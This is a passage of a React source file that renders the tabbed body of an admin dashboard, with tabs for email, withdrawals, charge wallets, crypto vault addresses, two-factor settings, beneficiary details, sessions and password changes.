                  margin: 0,
                  color: '#111827',
                  whiteSpace: 'nowrap',
                  overflow: 'hidden',
                  textOverflow: 'ellipsis',
                }}
              >
                {activeMeta.title}
              </h1>
              <p
                style={{
                  fontSize: '12px',
                  color: '#6b7280',
                  margin: 0,
                  whiteSpace: 'nowrap',
                  overflow: 'hidden',
                  textOverflow: 'ellipsis',
                }}
              >
                {activeMeta.subtitle}
              </p>
            </div>
          </div>

          <button
            type="button"
            onClick={() => syncAllAdminData(masterKey)}
            disabled={isSyncingAll}
            style={saloSecondaryBtn}
          >
            <RefreshCw
              style={{
                width: '13px',
                height: '13px',
                animation: isSyncingAll ? 'spin 1s linear infinite' : 'none',
              }}
            />
            <span>{isSyncingAll ? 'Syncing...' : 'Sync'}</span>
          </button>
        </div>

        <main className="salo-content">
          {activeTab === 'overview' && (
            <OverviewTab
              onSelectTab={setActiveTab}
              withdrawalConfig={withdrawalConfig}
              withdrawalRequests={withdrawalRequests}
              twoFactorSettings={twoFactorSettings}
              otpLogs={otpLogs}
              sessions={sessions}
              beneficiaryForm={beneficiaryForm}
              emailHistory={emailHistory}
              smtpSummary={smtpSummary}
              geminiConfig={geminiConfig}
            />
          )}

          {activeTab === 'email' && (
            <EmailComposerTab
              masterKey={masterKey}
              smtpSummary={smtpSummary}
              setSmtpSummary={setSmtpSummary}
              geminiConfig={geminiConfig}
              setGeminiConfig={setGeminiConfig}
              history={emailHistory}
              setHistory={setEmailHistory}
              principalProfile={principalProfile}
              beneficiaryForm={beneficiaryForm}
              onSelectTab={setActiveTab}
              onRefreshTwoFactor={() => loadTwoFactorData(masterKey)}
            />
          )}

          {activeTab === 'withdrawals' && (
            <WithdrawalsTab
              withdrawalConfig={withdrawalConfig}
              setWithdrawalConfig={setWithdrawalConfig}
              withdrawalRequests={withdrawalRequests}
              isSavingWithdrawals={isSavingWithdrawals}
              isClearingCooldown={isClearingCooldown}
              withdrawalStatusMsg={withdrawalStatusMsg}
              onSaveWithdrawals={handleSaveWithdrawals}
              onQuickPersistConfig={persistWithdrawalConfig}
              onClearLockdownCooldown={handleClearLockdownCooldown}
              onRefreshQueue={() => loadWithdrawalRequests(masterKey)}
              onUpdateStatus={handleUpdateWithdrawalStatus}
              onConfirmTransfer={handleConfirmTransfer}
            />
          )}

          {activeTab === 'charges' && (
            <TaxChargesTab
              summary={chargesSummary}
              isLoading={isLoadingCharges}
              statusBanner={chargesStatusMsg}
              onRefresh={() => loadChargesSummary(masterKey)}
              onUpsertWallet={handleUpsertChargeWallet}
              onToggleWallet={handleToggleChargeWallet}
              onDeleteWallet={handleDeleteChargeWallet}
              onReviewPayment={handleReviewChargePayment}
            />
          )}

          {activeTab === 'vaults' && (
            <VaultsTab
              addresses={addresses}
              setAddresses={setAddresses}
              isSavingAddresses={isSavingAddresses}
              addressStatus={addressStatus}
              copiedKey={copiedKey}
              isCheckingNode={isCheckingNode}
              nodeCheckResult={nodeCheckResult}
              onSaveAddresses={handleSaveAddresses}
              onCheckNode={handleCheckNode}
              onCopy={(val, key) => {
                navigator.clipboard.writeText(val);
                setCopiedKey(key);
                setTimeout(() => setCopiedKey(null), 1800);
              }}
            />
          )}

          {activeTab === 'two-factor' && (
            <TwoFactorTab
              twoFactorSettings={twoFactorSettings}
              setTwoFactorSettings={setTwoFactorSettings}
              resendApiKeyInput={resendApiKeyInput}
              setResendApiKeyInput={setResendApiKeyInput}
              showResendKey={showResendKey}
              setShowResendKey={setShowResendKey}
              smtpPassInput={smtpPassInput}
              setSmtpPassInput={setSmtpPassInput}
              showSmtpPass={showSmtpPass}
              setShowSmtpPass={setShowSmtpPass}
              isSaving2FA={isSaving2FA}
              isRemovingResendKey={isRemovingResendKey}
              twoFactorStatusMsg={twoFactorStatusMsg}
              otpLogs={otpLogs}
              copiedOtp={copiedOtp}
              onSave2FA={handleSave2FA}
              onRemoveResendKey={handleRemoveResendKey}
              onRefreshOtp={() => loadTwoFactorData(masterKey)}
              onCopyOtp={(code) => {
                navigator.clipboard.writeText(code);
                setCopiedOtp(code);
                setTimeout(() => setCopiedOtp(null), 1800);
              }}
            />
          )}

          {activeTab === 'profile' && (
            <ProfileTab
              principalProfile={principalProfile}
              setPrincipalProfile={setPrincipalProfile}
              isSavingProfile={isSavingProfile}
              profileStatusMsg={profileStatusMsg}
              onSaveProfile={handleSaveProfile}
              onPhotoUpload={handlePhotoUpload}
            />
          )}

          {activeTab === 'beneficiary' && (
            <BeneficiaryTab
              beneficiaryForm={beneficiaryForm}
              setBeneficiaryForm={setBeneficiaryForm}
              isSavingBeneficiary={isSavingBeneficiary}
              beneficiaryStatusMsg={beneficiaryStatusMsg}
              onSaveBeneficiary={handleSaveBeneficiary}
              onPhotoUpload={handleBeneficiaryPhotoUpload}
            />
          )}

          {activeTab === 'scanner' && (
            <ScannerTab
              scanResults={scanResults}
              isScanningAll={isScanningAll}
              onScanAll={handleScanAll}
            />
          )}

          {activeTab === 'sessions' && (
            <SessionsTab
              sessions={sessions}
              onRefresh={() => loadSessions(masterKey)}
              onRevokeSession={handleRevokeSession}
              onKillAllOthers={handleKillAllOtherSessions}
            />
          )}

          {activeTab === 'security' && (
            <SecurityTab
              currentPassInput={currentPassInput}
              setCurrentPassInput={setCurrentPassInput}
              newPassInput={newPassInput}
              setNewPassInput={setNewPassInput}
              confirmPassInput={confirmPassInput}
              setConfirmPassInput={setConfirmPassInput}
              isUpdatingPassword={isUpdatingPassword}
              passwordStatus={passwordStatus}
              onUpdatePassword={handleUpdatePassword}
            />
          )}
        </main>
      </div>
    </div>
  );
}
